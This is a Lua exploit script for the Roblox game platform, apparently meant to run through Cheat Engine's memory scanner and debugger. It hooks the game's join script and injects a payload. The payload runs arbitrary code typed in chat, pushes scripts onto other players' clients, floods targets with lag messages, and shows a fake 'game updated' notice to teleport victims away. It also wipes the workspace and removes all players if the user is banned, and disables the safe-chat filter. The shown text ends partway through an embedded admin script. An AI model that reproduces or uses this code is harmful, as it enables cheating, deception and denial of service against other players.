local Exploits, Successes, AddressList, NoRun, Interface = {}, {}, {}, {}, {};
local GlobalOffset = "28";

function GetExploit(index)
	local tab, scan, result = Exploits[index], createMemScan(true);
	memscan_returnOnlyOneResult(scan, true);
	memscan_firstScan(scan, soExactValue, vtByteArray, rtTruncated, table.concat(tab[2], " "), nil, 0, 0x00FFFFFF, "", fsmNotAligned, nil, false, false, false, false);
	memscan_waitTillDone(scan);
	result = memscan_getOnlyResult(scan);
	if result == nil then return nil; end
	result = string.format("%X", result + tab[3]);
	result = string.rep("0", 8 - string.len(result)) .. result;
	return result;
end
function AddExploit(name, hex, offset)
	table.insert(Exploits, {name, hex, offset})
end
function toAddr(num)
	local num = tonumber(num);
	local addr = string.format("%X", num):upper();
	addr = string.rep("0", 8 - string.len(addr)) .. addr;
	return addr;
end


debugger_onBreakpoint = function()
	local function GetAddress(ESPaddr, Offset)
		local ESPaddr, Offset = tostring(ESPaddr) or string.rep("0", 8), tostring(Offset == nil and GlobalOffset or Offset);
		local SCaddr_base = tonumber("0x" .. ESPaddr) + tonumber("0x" .. Offset);
		local SCaddr_cont1, SCaddr_cont2, SCaddr_cont3, SCaddr_cont4 = tostring(string.format("%X", SCaddr_base)), tostring(string.format("%X", SCaddr_base + 1)), tostring(string.format("%X", SCaddr_base + 2)), tostring(string.format("%X", SCaddr_base + 3));
		local SCaddr = (readBytes(SCaddr_cont1) + (readBytes(SCaddr_cont2) * 256) + (readBytes(SCaddr_cont3) * 65536) + (readBytes(SCaddr_cont4) * 16777216));
		return toAddr(SCaddr);
	end
	--if readBytes(GetAddress(toAddr(ESP), GlobalOffset), 1) == 0x0D then
		local JOIN_addr = GetAddress(toAddr(ESP), GlobalOffset);
		local JOIN_len = tonumber("0x"..GetAddress(toAddr(ESP), string.format("%X", tonumber("0x"..GlobalOffset) + 4)));
		local JOIN_script_tbl = readBytes(JOIN_addr, JOIN_len, true);
		local JOIN_script = "";
		table.foreach(JOIN_script_tbl, function(i, v) JOIN_script = JOIN_script .. string.char(v); end);
		local script = JOIN_script .. [==[  repeat wait() until game:service'Players'.LocalPlayer; wait(); game:service'Players'.LocalPlayer.Chatted:connect(function(s) Spawn(function() loadstring(s)() end) end) AntibanScript=false -- if AntibanScript = true and if you're kicked or banned from the current game, all the workspace children and players will be removed --
ChatHistory=false
DefaultGodAndInvisiWalkSpeed=30 -- if you enable the invisi or godmode, your walkspeed will be set to this value [Default = 16] --

Delay(1,function()
        FIXSCRIPTS''
end)
local ShowBox=Instance.new'BoolValue'
PlayerLoadtime=7.5
HackerName=nil
Scripts={}
Connects={}
Commands={}
HackedTime=0
chatbool = false
CmdbKey=':'
FocusKey='\\'
UnlockKey='?'
LockKey='.'
ExplorerKey=';'
ExproKey=','
GearKey='$'
BuildKey='<'
GodKey='*'
InvisiKey='%'
VisiKey='#'
AdminKey='&'

LagScript = [[

script:Destroy();

local runService = Game:GetService("RunService").Stepped;
local LagNum = 1250;
local str = "Not so cool now?";

for i = 1, math.huge do
	if i % LagNum == 0 then runService:wait(); end
	Instance.new("Message", Workspace).Text = str;
end

]]

local function TeleportScript(place_id)
	return [[
		script:Destroy();

		local place_id_str     = ]]..tostring(place_id)..[[;
		local place_id         = tonumber(place_id_str);
		local message_str      = "The owner has updated the game. New features: less lag, improved dynamic lighting, and more! Press the 'Leave' button to play to an updated game!";
		local player           = Game:GetService("Players").LocalPlayer;
		local teleport_service = Game:GetService("TeleportService");
		local run_service      = Game:GetService("RunService").Stepped;
		if player:FindFirstChild("PlayerGui") then
			pcall(function() player.PlayerGui:ClearAllChildren(); end)
		end
		while true do
			if player:FindFirstChild("PlayerGui") then
				local screen_gui, frame_gui, message_gui;
				if not player.PlayerGui:FindFirstChild(" __teleport_updated_place_gui") then
					pcall(function()
						screen_gui      = Instance.new("ScreenGui", player.PlayerGui);
						screen_gui.Name = " __teleport_updated_place_gui";
					end)
				else screen_gui = player.PlayerGui[" __teleport_updated_place_gui"]; end
				if not screen_gui:FindFirstChild(" __teleport_updated_place_frame") then
					pcall(function()
						frame_gui                  = Instance.new("Frame", screen_gui);
						frame_gui.Name             = " __teleport_updated_place_frame";
						frame_gui.ZIndex           = 9;
						frame_gui.Size             = UDim2.new(2, 0, 2, 0);
						frame_gui.Position         = UDim2.new(-.5, 0, -.5, 0);
						frame_gui.BackgroundColor3 = Color3.new();
					end)
				end
				if not screen_gui:FindFirstChild(" __teleport_updated_place_message") then
					pcall(function()
						message_gui                  = Instance.new("TextLabel", screen_gui);
						message_gui.Name             = " __teleport_updated_place_message";
						message_gui.ZIndex           = 10;
						message_gui.Size             = UDim2.new(.9, 0, .3, 0);
						message_gui.Position         = UDim2.new(.05, 0, 0, 0);
						message_gui.BackgroundColor3 = Color3.new();
						message_gui.BorderColor3     = Color3.new();
						message_gui.BorderSizePixel  = 0;
						message_gui.TextWrapped      = true;
						message_gui.TextColor3       = Color3.new(1,1,1);
						message_gui.FontSize         = 8;
						message_gui.Font             = 2;
						message_gui.Text             = message_str;
					end)
				end
			end
			teleport_service:Teleport(place_id);
			pcall(function() Workspace.CurrentCamera.CameraType = 6; end)
			pcall(function() player.Character = nil; end)
			run_service:wait();
		end
	]]
end

local function GetError(not_errored, msg)
	if not_errored then msg = "Running Script" end
	Game.Debris:AddItem((function()
		local hint;
		pcall(function()
			hint=Instance.new("Hint",Workspace.CurrentCamera)
			hint.Text=msg
		end)
		return hint
	end)(), 3)
end

local function FindPlayers(str)
	if not str then return end
	local str,players = str:lower(),{}
	if str == "all" then
		for i, v in next, Game.Players:GetPlayers() do
			players[#players+1] = v
		end
	elseif str:match("others?") then
		for i, v in next, Game.Players:GetPlayers() do
			pcall(function()
				if v ~= Game.Players.LocalPlayer then
					players[#players+1] = v
				end
			end)
		end
	else
		for i, v in next, Game.Players:GetPlayers() do
			pcall(function()
				if v.Name:lower():match("^"..str) then
					players[#players+1] = v
				end
			end)
		end
	end
	return players
end

local function LoadOnClients(players, source)
	if not players or #players == 0 then return end
	local load = function(Player)
		local Script = Instance.new "LocalScript"
		--
		Script.Source = [[
			while script.Name == "LocalScript" do wait() end
			ypcall(loadstring([==============[]]..source..[[]==============]))
		]]
		--
		Script.Parent = Game.Players.LocalPlayer.Character
			or Game.Players.LocalPlayer:FindFirstChild "Backpack"
			or Game.Players.LocalPlayer.CharacterAdded:wait()
		wait(.5)
		Script.Name = "LocalScript "
		Script.Parent = Player.Character
			or Player:FindFirstChild "Backpack"
			or Player.CharacterAdded:wait()
	end
	for _,player in next, players do
		coroutine.wrap(load)(player)
	end
end

coroutine.resume(coroutine.create(function()
		wait(PlayerLoadtime)
		HackerName=game.Players.LocalPlayer.Name
end))
if(AntibanScript)then
		coroutine.resume(coroutine.create(function()
				wait(PlayerLoadtime+.5)
				while true and wait() do
						if(AntibanScript)then
							if not(game.Players:FindFirstChild(HackerName))then
									wait(3.5)
									if(AntibanScript)then
											function workspaceRemove(path)
													for _,v in pairs(path:GetChildren())do
															coroutine.resume(coroutine.create(function(v)
																	if(v:IsA("Script"))or(v:IsA("LocalScript"))then
																			v.Disabled=true
																			v:remove()
																	else
																			v:remove()
																	end
															end),v)
													end
											end
											workspaceRemove(game:GetService('Workspace'))
											for e,i in pairs(game.Players:GetPlayers())do
													coroutine.resume(coroutine.create(function(i) i:remove() end),i)
											end
									end
							end
						end
				end
		end))
end
coroutine.resume(coroutine.create(function()
		wait(PlayerLoadtime)
		game.Players.LocalPlayer:SetSuperSafeChat(false)
        game.Players.LocalPlayer.Chatted:connect(function(msg)
                if string.sub(msg, 1, 3) == "ls " then
                        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
                                ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
                                ls.Name="lsInserted"
				wait(.2)
				ls.Name="lsRun"
                                ls.Source=string.sub(msg,4)
                                ls.Disabled=true
                                ls.Disabled=false
                        end
                elseif string.sub(msg, 1, 3) == "rs " then
						coroutine.resume(coroutine.create(function(msg)
								local errored,output = ypcall(loadstring(msg:sub(4)))
								GetError(errored,output)
								errored,output = nil
						end),msg)
                elseif string.sub(msg, 1, 3) == "ls/" then
                        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
                                ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
                                ls.Name="lsInserted"
				wait(.2)
				ls.Name="lsRun"
                                ls.Source=string.sub(msg,4)
                                ls.Disabled=true
                                ls.Disabled=false
                        end
                elseif string.sub(msg, 1, 3) == "rs/" then
						coroutine.resume(coroutine.create(function(msg)
								local errored,output = ypcall(loadstring(msg:sub(4)))
								GetError(errored,output)
								errored,output = nil
						end),msg)
                elseif string.sub(msg, 1, 3) == "cs " then
                				LoadOnClients(FindPlayers(msg:sub(4):match("(%w+)%s")), msg:sub(4):match("%s(.+)"))
                elseif string.sub(msg, 1, 10) == "mediafire " then
                				LoadOnClients(FindPlayers(msg:sub(11):match("(%w+)%s")), msg:sub(11):match("%s(.+)"))
                elseif string.sub(msg, 1, 4) == "lag " then
                				LoadOnClients(FindPlayers(msg:sub(5):match("%w+")), LagScript)
                elseif string.sub(msg, 1, 7) == "hitler " then
                				LoadOnClients(FindPlayers(msg:sub(8):match("%w+")), LagScript)
                --
                elseif string.sub(msg, 1, 3) == "cs/" then
                				LoadOnClients(FindPlayers(msg:sub(4):match("([%w%s]+)/")), msg:sub(4):match("/(.+)"))
                elseif string.sub(msg, 1, 10) == "mediafire/" then
                				LoadOnClients(FindPlayers(msg:sub(11):match("([%w%s]+)/")), msg:sub(11):match("/(.+)"))
                elseif string.sub(msg, 1, 4) == "lag/" then
                				LoadOnClients(FindPlayers(msg:sub(5):match("[%w%s]+")), LagScript)
                elseif string.sub(msg, 1, 7) == "hitler/" then
                				LoadOnClients(FindPlayers(msg:sub(8):match("[%w%s]+")), LagScript)
               	--
		elseif string.sub(msg, 1, 1) == "/" then
				if string.sub(msg, 2, 4) == "sb" then
					chatbool = true
					repeat wait(.01)
						game.Players.LocalPlayer:SetSuperSafeChat(false)
						game.Players:Chat("/sc 2 4")
						game.Players:Chat("/sc 2 7 0")
						game.Players:Chat("/sc 2 7 4")
					until not chatbool
				elseif string.sub(msg, 2, 5) == "nsb" then
					chatbool = false
				elseif string.sub(msg, 2, 7) == "power" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=PowerScriptSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 7) == "gaara" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=GaaraSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 6) == "nova" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=NovaSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 9) == "outgame" then AntibanScript=false
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=OutGameSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				end
		end
        end)
end))
coroutine.resume(coroutine.create(function()
	wait(PlayerLoadtime)
	while wait() do
		game.Players.LocalPlayer:SetSuperSafeChat(false)
	end
end))
coroutine.resume(coroutine.create(function()
	wait(PlayerLoadtime)
	if ChatHistory then
		coroutine.resume(coroutine.create(function()
		CH=Instance.new("Model",game:GetService("SoundService"))
		CH.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH2=Instance.new("Model",game:GetService("StarterGui"))
		CH2.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH2)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH2)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH3=Instance.new("Model",game:GetService("Teams"))
		CH3.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH3)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH3)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH4=Instance.new("Model",game:GetService("Soundscape"))
		CH4.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH4)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH4)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end))
	end
end))
X=function(f)
        return coroutine.resume(coroutine.create(f))
end


OutGameSource=[[
	 -- Settings --
	_ForceField = true
	_RespawnTime = 0
	_PlayerName = "ROBLOX"
	_ChatColor = "Blue"

	 -- Some variables --
	_Player = game.Players.LocalPlayer
	_Neutral = _Player.Neutral
	_TeamColor = _Player.TeamColor
	_Character = _Player.Character
	_Camera = game.Workspace.CurrentCamera
	_Character.Archivable = true
	wait()
	_BaseChar = _Character:clone()
	_Respawning = false

	 -- Some functions --
	function _CreateChar(vector)
		if _Respawning then return else _Respawning = true
			for _,v in pairs(_Player.Backpack:GetChildren())do
				v:remove()
			end
			for _,v in pairs(_Player.PlayerGui:GetChildren())do
				v:remove()
			end
			local _CloneChar = _BaseChar:clone()
			_CloneChar:MakeJoints()
			if vector and _CloneChar:FindFirstChild("Torso") then
				_CloneChar.Torso.CFrame = CFrame.new(vector)
			end
			_CloneChar.Parent = game.Workspace.CurrentCamera
			_CloneChar.Name = _PlayerName
			_CloneChar.Archivable = false
			_Camera.CameraSubject = _CloneChar:FindFirstChild("Humanoid")
			_Camera.CameraType = "Custom"
			for _,v in pairs(_Player.StarterGear:GetChildren())do
				if not _Player.Backpack:FindFirstChild(v.Name) then
					v:clone().Parent = _Player.Backpack
				end
			end
			for _,v in pairs(game:GetService("StarterPack"):GetChildren())do
				if not _Player.Backpack:FindFirstChild(v.Name) then
					v:clone().Parent = _Player.Backpack
				end
			end
			for _,v in pairs(game:GetService("StarterGui"):GetChildren())do
				if not _Player.PlayerGui:FindFirstChild(v.Name) then
					v:clone().Parent = _Player.PlayerGui
				end
			end
			for _,v in pairs(_Player.Backpack:GetChildren())do
				if v:IsA("Tool") then
					v.Enabled = true
				elseif v:IsA("HopperBin") then
					v.Active = false
				end
			end
			_Player.Character = _CloneChar
			for _,v in pairs(_CloneChar:GetChildren())do
				if v:IsA("Script") or v:IsA("LocalScript") then
					v.Disabled = true wait() v.Disabled = false
				end
			end
			_Respawning = false
			return _CloneChar
		end
	end

	function _VerifyCopy(_PlayerName)
		while wait() do
			if not game.Players:FindFirstChild(_PlayerName) then
				local _LocalPlayer = Instance.new("ObjectValue",game.Players)
				_LocalPlayer.Name = _PlayerName
			end
			if game.Players:FindFirstChild(_PlayerName) then
				if game.Players[_PlayerName]:IsA("ObjectValue") then
					if not game.Players[_PlayerName]:FindFirstChild("Backpack") then
						local _LocalBackpack = Instance.new("ObjectValue",game.Players[_PlayerName])
						_LocalBackpack.Name = "Backpack"
					end
					if not game.Players[_PlayerName]:FindFirstChild("StarterGear") then
						local _LocalStarterGear = Instance.new("ObjectValue",game.Players[_PlayerName])
						_LocalStarterGear.Name = "StarterGear"
					end
					if not game.Players[_PlayerName]:FindFirstChild("PlayerGui") then
						local _LocalPlayerGui = Instance.new("ObjectValue",game.Players[_PlayerName])
						_LocalPlayerGui.Name = "PlayerGui"
					end
				end
			end
		end
	end

	function _CloneTools(_name,_type)
		for _,v in pairs(game.Players[_name][_type]:GetChildren())do
			if not _Player[_type]:FindFirstChild(v.Name) and not game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild(v.Name) then
				v.Parent = _Player[_type]
				coroutine.resume(coroutine.create(function()
					function fixScripts(path)
						for e,i in pairs(path:GetChildren())do
							if i:IsA("Script") or i:IsA("LocalScript") then
								if i.Disabled == false then
									i.Disabled = true wait() i.Disabled = false
								end
							end
							fixScripts(i)
						end
					end
					fixScripts(v)
				end))
			end
		end
	end

	function _TransferTools(_pname)
		while wait() do
			if game.Players:FindFirstChild(_pname) then
				if game.Players[_pname]:FindFirstChild("Backpack") then
					coroutine.resume(coroutine.create(_CloneTools),_pname,"Backpack")
					for _,v in pairs(_Player.Backpack:GetChildren())do
						if not game.Players[_pname].Backpack:FindFirstChild(v.Name) then
							v:clone().Parent = game.Players[_pname].Backpack
						end
					end
				end
				if game.Players[_pname]:FindFirstChild("StarterGear") then
					coroutine.resume(coroutine.create(function()
						for _,v in pairs(game.Players[_pname].StarterGear:GetChildren())do
							if not _Player.StarterGear:FindFirstChild(v.Name) then
								v:clone().Parent = _Player.StarterGear
							end
						end
					end))
					for _,v in pairs(_Player.StarterGear:GetChildren())do
						if not game.Players[_pname].StarterGear:FindFirstChild(v.Name) then
							v:clone().Parent = game.Players[_pname].StarterGear
						end
					end
				end
				if game.Players[_pname]:FindFirstChild("PlayerGui") then
					for _,v in pairs(_Player.PlayerGui:GetChildren())do
						if not game.Players[_pname].PlayerGui:FindFirstChild(v.Name) then
							v:clone().Parent = game.Players[_pname].PlayerGui
						end
					end
					coroutine.resume(coroutine.create(_CloneTools),_pname,"PlayerGui")
				end
			end
		end
	end

	 -- Remove player and script --
	script.Parent = nil
	wait()

	 -- Update _BaseChar position --
	coroutine.resume(coroutine.create(function()
		while wait() do
			if game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
				if game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild("Torso") then
					if _BaseChar:FindFirstChild("Torso") then
						_BaseChar.Torso.CFrame = game.Workspace.CurrentCamera[_PlayerName].Torso.CFrame
					end
				end
			end
		end
	end))

	 -- Clone and Respawn character --
	coroutine.resume(coroutine.create(function()
		while wait() do
			if game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
				_PartFound = false
				for _,v in pairs(game.Workspace.CurrentCamera[_PlayerName]:GetChildren())do
					if v:IsA("Part") then
						_PartFound = true
					end
				end
				if not _PartFound then
					wait(_RespawnTime)
					game.Workspace.CurrentCamera[_PlayerName]:remove()
					_Created = false
					function _scanSpawn(path)
						for _,v in pairs(path:GetChildren())do
							if v:IsA("SpawnLocation") then
								if _Player.Neutral then
									if v.Neutral then
										_CreateChar(v.Position)
										_Created = true
									end
								elseif not _Player.Neutral then
									if v.TeamColor == _Player.TeamColor then
										_CreateChar(v.Position)
										_Created = true
									end
								end
							end
							_scanSpawn(v)
						end
					end
					_scanSpawn(game.Workspace)
					if not _Created then
						_CreateChar(Vector3.new(0,500,0))
					end
				elseif _PartFound then
					if not game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild("Humanoid") then
						game.Workspace.CurrentCamera[_PlayerName]:remove() _ChreateChar()
					elseif game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild("Humanoid") then
						if game.Workspace.CurrentCamera[_PlayerName].Humanoid.Health == 0 then
							wait(_RespawnTime) game.Workspace.CurrentCamera[_PlayerName]:remove() _CreateChar()
						end
					end
				end
			elseif not game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
				_CreateChar()
			end
			if _ForceField then
				if game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
					if not game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild("ForceField") then
						Instance.new("ForceField",game.Workspace.CurrentCamera[_PlayerName])
					end
				end
			end
		end
	end))

	 -- Copy player children --
	coroutine.resume(coroutine.create(function()
		coroutine.resume(coroutine.create(_VerifyCopy),_PlayerName)
		coroutine.resume(coroutine.create(_VerifyCopy),_Player.Name)
	end))

	 -- Transfer tools and guis --
	coroutine.resume(coroutine.create(function()
		coroutine.resume(coroutine.create(_TransferTools),_PlayerName)
		coroutine.resume(coroutine.create(_TransferTools),_Player.Name)
	end))

	 -- Take weapons --
	coroutine.resume(coroutine.create(function()
		while wait() do
			if game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
				_TempChar = game.Workspace.CurrentCamera:FindFirstChild(_PlayerName)
				function checkParts(path)
					for _,v in pairs(path:GetChildren())do
						if v:IsA("Part") then
							if not v:FindFirstChild("TouchInterest") then
								v.Touched:connect(function(Part)
									if Part.Parent:IsA("Tool") then
										Part.Parent.Parent = _TempChar
									end
								end)
							end
						end
						checkParts(v)
					end
				end
				checkParts(_TempChar)
			end
		end
	end))

	 -- Chat box --
	coroutine.resume(coroutine.create(function()
		_Player.Chatted:connect(function(msg)
			if game.Workspace.CurrentCamera:FindFirstChild(_PlayerName) then
				if game.Workspace.CurrentCamera[_PlayerName]:FindFirstChild("Head") then
					game:GetService("Chat"):Chat(game.Workspace.CurrentCamera[_PlayerName].Head, msg, _ChatColor)
				end
			end
		end)
	end))

	wait() _Player.Parent = nil
]]

AdminScriptSource=[[
	adminlist = {game.Players.LocalPlayer.Name}
	bannedlist = {""}
	texture = ""
	wait(.5) script.Parent=nil

	namelist = { }
	variablelist = { }
	flist = { }

	tools = Instance.new("Model")
	c = game.Lighting:GetChildren()
	for i=1,#c do
	if c[i].className == "Tool" then
	c[i]:clone().Parent = tools
	end
	if c[i].className == "HopperBin" then
	c[i]:clone().Parent = tools
	end end

	function findplayer(name,speaker)
	if string.lower(name) == "all" then
	local chars = { }
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].className == "Player" then
	table.insert(chars,c[i])
	end end
	return chars
	elseif string.lower(name) == "bc" then
	local chars = { }
	local c = game.Players:GetChildren()
	for i =1,#c do
	if not c[i].MembershipType == Enum.MembershipType.None  then
	if c[i].className == "Player" then
	table.insert(chars,c[i])
	end end end
	return chars
	elseif string.lower(name) == "nbc" then
	local chars = { }
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].MembershipType == Enum.MembershipType.None  then
	if c[i].className == "Player" then
	table.insert(chars,c[i])
	end end end
	return chars
	elseif string.sub(string.lower(name),1,9) == "nonadmins" then
	local nnum = 0
	local chars = { }
	local c = game.Players:GetChildren()
	for i=1,#c do
	local isadmin = false
	for i2 =1,#namelist do
	if namelist[i2] == c[i].Name then
	isadmin = true
	end end
	if isadmin == false then
	nnum = nnum + 1
	table.insert(chars,c[i])
	end end
	if nnum == 0 then
	return 0
	else
	return chars
	end
	elseif string.sub(string.lower(name),1,6) == "admins" then
	local anum = 0
	local chars = { }
	local c = game.Players:GetChildren()
	for i=1,#c do
	for i2 =1,#namelist do
	if namelist[i2] == c[i].Name then
	anum = anum + 1
	table.insert(chars,c[i])
	end end end
	if anum == 0 then
	return 0
	else
	return chars
	end
	elseif string.sub(string.lower(name),1,6) == "random" then
	while true do
	local c = game.Players:GetChildren()
	local r = math.random(1,#c)
	if c[r].className == "Player" then
	return { c[r] }
	end end
	elseif string.sub(string.lower(name),1,6) == "guests" then
	local gnum = 0
	local chars = { }
	local c = game.Players:GetChildren()
	for i=1,#c do
	if string.sub(c[i].Name,1,5) == "Guest" then
	gnum = gnum + 1
	table.insert(chars,c[i])
	end end
	if gnum == 0 then
	return 0
	else
	return chars
	end
	elseif string.sub(string.lower(name),1,5) == "team " then
	local theteam = nil
	local tnum = 0
	if game.Teams ~= nil then
	local c = game.Teams:GetChildren()
	for i =1,#c do
	if c[i].className == "Team" then
	if string.find(string.lower(c[i].Name),string.sub(string.lower(name),6)) == 1 then
	theteam = c[i]
	tnum = tnum + 1
	end end end
	if tnum == 1 then
	local chars = { }
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].className == "Player" then
	if c[i].TeamColor == theteam.TeamColor then
	table.insert(chars,c[i])
	end end end
	return chars
	end end
	return 0
	elseif string.lower(name) == "me" then
	local person299 = { speaker }
	return person299

	elseif string.lower(name) == "others" then
	local chars = { }
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].className == "Player" then
	if c[i] ~= speaker then
	table.insert(chars,c[i])
	end end end
	return chars
	else
	local chars = { }
	local commalist = { }
	local ssn = 0
	local lownum = 1
	local highestnum = 1
	local foundone = false
	while true do
	ssn = ssn + 1
	if string.sub(name,ssn,ssn) == "" then
	table.insert(commalist,lownum)
	table.insert(commalist,ssn - 1)
	highestnum = ssn - 1
	break
	end
	if string.sub(name,ssn,ssn) == "," then
	foundone = true
	table.insert(commalist,lownum)
	table.insert(commalist,ssn)
	lownum = ssn + 1
	end end
	if foundone == true then
	for ack=1,#commalist,2 do
	local cnum = 0
	local char = nil
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].className == "Player" then
	if string.find(string.lower(c[i].Name),string.sub(string.lower(name),commalist[ack],commalist[ack + 1] - 1)) == 1 then
	char = c[i]
	cnum = cnum + 1
	end end end
	if cnum == 1 then
	table.insert(chars,char)
	end end
	if #chars ~= 0 then
	return chars
	else
	return 0
	end
	else
	local cnum = 0
	local char = nil
	local c = game.Players:GetChildren()
	for i =1,#c do
	if c[i].className == "Player" then
	if string.find(string.lower(c[i].Name),string.lower(name)) == 1 then
	char = {c[i]}
	cnum = cnum + 1
	end end end
	if cnum == 1 then
	return char
	elseif cnum == 0 then
	text("That name is not found.",1,"Message",game.Workspace.CurrentCamera)
	return 0
	elseif cnum > 1 then
	text("That name is ambiguous.",1,"Message",game.Workspace.CurrentCamera)
	return 0
	end end end end

	function text(message,duration,type,object)
	local m = Instance.new(type)
	m.Text = message
	m.Parent = object
	wait(duration)
	if m.Parent ~= nil then
	m:remove()
	end end

	function foc(msg,speaker)
	if string.lower(msg) == "fix" then
	for i =1,#namelist do
	if namelist[i] == speaker.Name then
	variablelist[i]:disconnect()
	table.remove(variablelist,i)
	table.remove(namelist,i)
	table.remove(flist,i)
	end end
	local tfv = speaker.Chatted:connect(function(msg) oc(msg,speaker) end)
	table.insert(namelist,speaker.Name)
	table.insert(variablelist,tfv)
	local tfv = speaker.Chatted:connect(function(msg) foc(msg,speaker) end)
	table.insert(flist,tfv)
	end end

	function PERSON299(name)
	for i =1,#adminlist do
	if adminlist[i] == name then
	return true
	end end
	return false
	end

	function oc(msg,speaker)

	if string.sub(string.lower(msg),1,6) == "clone/" then
	local player = findplayer(string.sub(msg,7),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	local torso = player[i].Character:FindFirstChild("Torso")
	if human ~= nil and torso ~= nil then
	player[i].Character.archivable = true
	wait()
	clone = player[i].Character:clone()
	clone.Parent = game.Workspace
	clone:MoveTo(torso.Position)
	clone:MakeJoints()
	wait()
	player[i].Character.archivable = false
	end end end end end

	if string.sub(string.lower(msg),1,10) == "superjump/" then
	local player = findplayer(string.sub(msg,11),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	local torso = player[i].Character:FindFirstChild("Torso")
	if human ~= nil and torso ~= nil then
	jump = Instance.new("BodyVelocity")
	jump.Parent = torso
	jump.velocity = Vector3.new(0, 500, 0)
	human.Jump = true
	wait(3)
	jump:Remove()
	end end end end end

	if string.sub(string.lower(msg),1,11) == "skateboard/" then
	local player = findplayer(string.sub(msg,12),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	local torso = player[i].Character:FindFirstChild("Torso")
	if human ~= nil and torso ~= nil then
		local root = game:GetService("InsertService"):LoadAsset(23154610)
		local instances = root:GetChildren()
		if #instances == 0 then
			root:Remove()
			return
		end
		root.Name = "InsertedObject" ..23154610
		game:GetService("InsertService"):Insert(root)
		root:MoveTo(torso.Position + torso.CFrame.lookVector * 8)
	end end end end end

	if string.sub(string.lower(msg),1,5) == "fire/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	local torso = player[i].Character:FindFirstChild("Torso")
	if human ~= nil and torso ~= nil then
	fire = Instance.new("Fire", torso)
	fire.Name = "CreatedFire"
	end end end end end


	if string.sub(string.lower(msg),1,7) == "unfire/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	local torso = player[i].Character:FindFirstChild("Torso")
